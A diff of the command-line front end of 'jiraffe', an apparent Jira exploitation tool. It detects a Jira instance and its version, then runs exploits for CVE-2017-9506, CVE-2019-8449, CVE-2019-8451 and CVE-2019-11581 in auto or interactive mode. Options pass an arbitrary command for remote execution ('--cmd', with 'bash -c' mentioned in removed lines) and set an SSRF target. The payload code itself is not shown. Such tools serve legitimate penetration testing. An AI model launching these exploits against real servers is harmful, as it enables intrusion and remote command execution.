@@ -3,6 +3,7 @@
 
 import sys
 import argparse
+import json
 import textwrap
 
 # version guard
@@ -11,147 +12,203 @@ if sys.version_info[0] < 3:
     sys.exit(1)
 
 from urllib.parse import urlparse
-from .recon import isjira, getversion
-from .exploits import (
-	cve2017_9506,
-	cve2019_8449,
-	cve2019_8451,
-	cve2019_11581,
-)
+
+from jiraffe import __version__
+from jiraffe.style import Style
+from jiraffe.http import HttpClient
+from jiraffe.exploits import ALL_EXPLOITS
+from jiraffe.recon import isjira, getversion, uparse
+from jiraffe.compat import is_compatible
+from jiraffe.enums import Severity
 
 
-class Style:
-	ENABLED = True
-
-	@staticmethod
-	def _wrap(code, text):
-		if not Style.ENABLED:
-			return str(text)
-		return "\033[{}m{}\033[0m".format(code, text)
-
-	BLACK = staticmethod(lambda x: Style._wrap("30", x))
-	RED = staticmethod(lambda x: Style._wrap("31", x))
-	GREEN = staticmethod(lambda x: Style._wrap("32", x))
-	YELLOW = staticmethod(lambda x: Style._wrap("33", x))
-	BLUE = staticmethod(lambda x: Style._wrap("34", x))
-	MAGENTA = staticmethod(lambda x: Style._wrap("35", x))
-	CYAN = staticmethod(lambda x: Style._wrap("36", x))
-	WHITE = staticmethod(lambda x: Style._wrap("37", x))
-	UNDERLINE = staticmethod(lambda x: Style._wrap("4", x))
-	RESET = staticmethod(lambda x: "\033[0m" + str(x))
-
-BANNER = textwrap.dedent(r'''
+BANNER = textwrap.dedent(rf'''
                                                                            /)/)
                                                                           ( ..\    
       ___  __      _______        __       _______   _______   _______    /'-._)
-     |   ||  \    /       \      /  \     /       | /       | /       |  /#/  
-     ||  |||  |  |:        |    /    \   (: ______)(: ______)(: ______) /#/  @0x48piraj 
+     |   ||  \    /       \      /  \     /       | /       | /       |  /#/ v{__version__}
+     ||  |||  |  |:        |    /    \   (: ______)(: ______)(: ______) /#/  @03C0
      |:  ||:  |  |_____/   )   /' /\  \   \/    |   \/    |   \/    |   
   ___|  / |.  |   //      /   //  __'  \  // ___)   // ___)   // ___)_  
  /  :|_/ )/\  |\ |:  __   \  /   /  \\  \(:  (     (:  (     (:       | 
 (_______/(__\_|_)|__|  \___)(___/    \___)\__/      \__/      \_______)
 ''')
 
-AUTO_EXPLOIT_ORDER = [
-    "3",  # CVE-2019-8451
-    "1",  # CVE-2017-9506
-    "2",  # CVE-2019-8449
-    "4",  # CVE-2019-11581
-]
+def validate_target(url: str) -> bool:
+    parsed = urlparse(url)
+    return parsed.scheme in ("http", "https") and bool(parsed.netloc)
 
-INTERACTIVE_EXPLOITS = {
-	"1": ("CVE-2017-9506", cve2017_9506),
-	"2": ("CVE-2019-8449", cve2019_8449),
-	"3": ("CVE-2019-8451", cve2019_8451),
-	"4": ("CVE-2019-11581", cve2019_11581),
-}
+def list_exploits():
+    print("Available exploits:\n")
+    for exp in ALL_EXPLOITS:
+        print(
+            f"- {exp.cve:<18} "
+            f"[{exp.severity.value:<8}] "
+            f"{exp.description}"
+        )
+    sys.exit(0)
 
-def validate_target(url):
-	parsed = urlparse(url)
-	return parsed.scheme in ("http", "https") and parsed.netloc
+def interactive_exploit_menu(exploits):
+    print(Style.YELLOW("[*] Choose the exploit...\n"))
+
+    for i, exp in enumerate(exploits, 1):
+        print(
+            f"{i}. {exp.cve} "
+            f"[{exp.severity.value}]"
+        )
+
+    try:
+        choice = input("\n----> ").strip()
+        idx = int(choice) - 1
+        return exploits[idx]
+    except KeyboardInterrupt:
+        print(Style.RED("Interrupted."))
+        sys.exit(0)
+    except (ValueError, IndexError):
+        print(Style.RED("[-] Invalid option selected."))
+        return None
 
 def main():
-	parser = argparse.ArgumentParser(
-		formatter_class=argparse.RawDescriptionHelpFormatter,
-		description=Style.GREEN(BANNER),
-		usage=(
-			Style.GREEN("jiraffe ")
-			+ Style.YELLOW("[-h] [-t {}]").format(
-				Style.UNDERLINE("https://example-jira-instance.com")
-			)
-		),
-	)
+    parser = argparse.ArgumentParser(
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        description=Style.GREEN(BANNER),
+        usage=(
+            Style.GREEN("jiraffe ")
+            + Style.YELLOW("[-h] [-t {}]").format(
+                Style.UNDERLINE("https://example-jira-instance.com")
+            )
+        ),
+    )
 
-	parser.add_argument("-t", "--target", help="Target Jira URL")
-	parser.add_argument("-a", "--auto", action="store_true", help="Automatic mode")
-	parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
+    parser.add_argument("-t", "--target", help=Style.GREEN("Target Jira Instance URL"), metavar=Style.CYAN("https://example-jira-instance.com"), default=False)
+    parser.add_argument("-a", "--auto", action="store_true", help=Style.MAGENTA("Automatic mode"))
 
-	args = parser.parse_args()
+    parser.add_argument(
+        "--check-only", "--dry-run",
+        dest="check_only",
+        action="store_true",
+        help="Only check for vulnerabilities, do not run exploits",
+    )
 
-	print(Style.GREEN(BANNER) + Style.RESET(""))
+    parser.add_argument("--list-exploits", action="store_true")
+    parser.add_argument("--cmd", help="Command for CVE-2019-11581")
+    parser.add_argument("--ssrf", help="SSRF target URL")
 
-	target = args.target
-	try:
-		if not target:
-			print(Style.YELLOW("[*] Target not provided, invoking interactive mode..."))
-			print("[*] Enter the target Jira instance URL (https://example-jira-instance.com)")
-			target = input(Style.GREEN("	----> ")).strip()
-	except KeyboardInterrupt:
-		print(Style.RED("Interrupted."))
-		sys.exit(0) # http://tldp.org/LDP/abs/html/exitcodes.html#EXITCODESREF
+    parser.add_argument(
+        "--severity",
+        choices=[s.value for s in Severity],
+        help="Run only exploits of this severity",
+    )
 
-	if not target or not validate_target(target):
-		print(Style.RED("[-] Not provided any valid target. Quitting."))
-		sys.exit(1)
+    parser.add_argument(
+        "--json",
+        action="store_true",
+        help="Output results in JSON format (for automation / scripting)",
+    )
 
-	if args.auto:
-		print(Style.YELLOW("[*] Detecting the target..."))
-		if isjira(target):
-			print(
-				Style.GREEN("[+] Jira instance detected") + "\n"
-				+ Style.YELLOW("[*] Enumerating the version...")
-			)
+    parser.add_argument(
+        "--insecure",
+        action="store_true",
+        help="Disable TLS certificate verification (allow self-signed HTTPS)",
+    )
 
-			version = getversion(target)
-			if version:
-				print(
-					Style.GREEN("[+] Jira version detected: ")
-					+ Style.UNDERLINE(version)
-				)
-			else:
-				print(Style.RED("[-] Jira version detection failed."))
+    parser.add_argument(
+        "-v", "--verbose",
+        action="store_true",
+        help="Enable verbose output (debug information)",
+    )
 
-			print(Style.YELLOW("[*] Launching all exploits..."))
-			for key in AUTO_EXPLOIT_ORDER:
-				_, exploit = INTERACTIVE_EXPLOITS[key]
-				exploit(target)
-	else:
-		print(Style.YELLOW("[*] Mode not provided, invoking interactive mode..."))
-		print("[*] Choose the exploit...")
+    args = parser.parse_args()
 
-		print(Style.GREEN(
-			"\n\n"
-			"1. CVE-2017-9506 [HIGH]\n"
-			"2. CVE-2019-8449 [LOW]\n"
-			"3. CVE-2019-8451 [HIGH]\n"
-			"4. CVE-2019-11581 [CRITICAL]"
-		))
+    print(Style.GREEN(BANNER) + Style.RESET(""))
 
-		choice = input(Style.GREEN("	----> ")).strip()
-		if choice not in INTERACTIVE_EXPLOITS:
-			print(Style.RED("[-] Invalid option selected. Quitting."))
-			return
+    if args.list_exploits:
+        list_exploits()
 
-		_, exploit = INTERACTIVE_EXPLOITS[choice]
-		if choice == "4":
-			print("[*] Input the payload (spawning harmless 'calc.exe', or maybe bash -c '...')")
-			cmd = input("Enter the payload (default: calc.exe): ").strip()
-			if cmd:
-				cve2019_11581(target, cmd)
-			else:
-				cve2019_11581(target)
-		else:
-			exploit(target)
+    # Interactive target input
+    target = uparse(args.target)
+    try:
+        if not target:
+            print(Style.YELLOW("[*] Target not provided, invoking interactive mode..."))
+            print("[*] Enter the target Jira instance URL (https://example-jira-instance.com)")
+            target = input(Style.GREEN("    ----> ")).strip()
+    except KeyboardInterrupt:
+        print(Style.RED("Interrupted."))
+        sys.exit(0)
+
+    if not target or not validate_target(target):
+        print(Style.RED("[-] Invalid target URL."))
+        sys.exit(1)
+
+    client = HttpClient(verify_ssl=not args.insecure)
+
+    if not isjira(target, client):
+        print(Style.RED("[-] Target does not appear to be Jira."))
+        sys.exit(1)
+
+    jira_version = getversion(target, client)
+    if jira_version:
+        print(Style.GREEN("[+] Jira version detected: ") + Style.MAGENTA(jira_version))
+
+    selected = ALL_EXPLOITS
+
+    # Severity filter
+    if args.severity:
+        selected = [
+            e for e in selected if e.severity.value == args.severity
+        ]
+
+    results = []
+
+    # AUTO MODE
+    if args.auto:
+        exploit_classes = selected
+
+    # INTERACTIVE MODE
+    else:
+        exploit_cls = interactive_exploit_menu(selected)
+        if not exploit_cls:
+            sys.exit(1)
+        exploit_classes = [exploit_cls]
+
+    # Exploit execution
+    for exploit_cls in exploit_classes:
+        if jira_version and not is_compatible(exploit_cls.cve, jira_version):
+            print(
+                Style.YELLOW(
+                    f"[!] {exploit_cls.cve} may not be compatible with Jira {jira_version}"
+                )
+            )
+
+        kwargs = {
+            "verbose": args.verbose,
+            "check_only": args.check_only,
+        }
+
+        if args.ssrf:
+            kwargs["ssrf_target"] = args.ssrf
+
+        if exploit_cls.cve == "CVE-2019-11581" and args.cmd:
+            kwargs["command"] = args.cmd
+
+        exploit = exploit_cls(client, target, **kwargs)
+        ok = exploit.run()
+
+        results.append({
+            "cve": exploit.cve,
+            "severity": exploit.severity.value,
+            "vulnerable": bool(ok),
+        })
+
+    if args.json:
+        print(json.dumps({
+            "target": target,
+            "results": results
+        }, indent=2))
 
 if __name__ == "__main__":
-	main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(Style.RED("Interrupted."))
+        sys.exit(0) # http://tldp.org/LDP/abs/html/exitcodes.html#EXITCODESREF
